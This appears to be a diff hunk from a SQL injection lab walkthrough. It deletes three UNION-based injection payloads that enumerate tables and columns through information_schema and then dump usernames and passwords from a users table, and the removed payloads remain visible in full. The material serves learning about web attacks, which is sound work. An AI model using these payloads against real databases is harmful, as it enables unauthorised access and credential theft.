@@ -212,13 +212,13 @@ etc...
 ```
 3. Determinate the tables into the database
 ```sql
-' UNION SELECT table_name,NULL FROM information_schema.tables--
+
 ``` 
 4. Determinate the columns stored into tables
 ```sql
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
+
 ```
 5. Once we have the information of the columns, we dump the information
 ```sql
-' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
+
 ```
